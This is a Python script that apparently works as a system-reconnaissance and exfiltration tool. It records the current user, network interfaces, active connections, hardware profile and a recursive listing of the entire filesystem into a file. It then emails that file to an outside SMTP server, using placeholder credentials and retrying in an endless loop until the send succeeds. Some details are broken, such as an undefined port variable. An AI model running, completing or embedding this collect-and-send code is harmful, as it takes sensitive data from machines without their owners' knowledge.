import subprocess
import smtplib
import mimetypes
import email
import email.mime.application
import email.mime.multipart
import email.mime.text
import os

os.system('touch "stdout.txt"')
npath = subprocess.check_output('pwd')
patha = npath[:-1]
pathb = 's'+str(patha)
pathc = pathb[3:]
filename = pathc[:-1]+'/stdout.txt'

os.chdir('/')

with open(filename,'ab') as out: subprocess.Popen("whoami", stdout=out), \
    subprocess.Popen("ifconfig", stdout=out),\
    subprocess.Popen("netstat", stdout=out), \
    subprocess.Popen("system_profiler", stdout=out), \
    subprocess.Popen(["ls", "-R"], stdout=out)

msg = email.mime.multipart.MIMEMultipart()
msg['Subject'] = 'System Overview'
msg['From'] = 'sender'
msg['To'] = 'recipient'

body = email.mime.text.MIMEText("""Please see attachment for full system report.""")
msg.attach(body)

fp=open(filename,'rb')
att = email.mime.application.MIMEApplication(fp.read())
fp.close()
att.add_header('Content-Disposition','attachment',filename=filename)
msg.attach(att)

while True:    
    try:
        server = smtplib.SMTP('server', port)
        server.starttls()
        server.login('sender', 'password')
        server.sendmail('sender','recipient', msg.as_string())
        break
    except:
        #optional msg on exception
        print("Error: unable to send email.  Trying again")
        continue
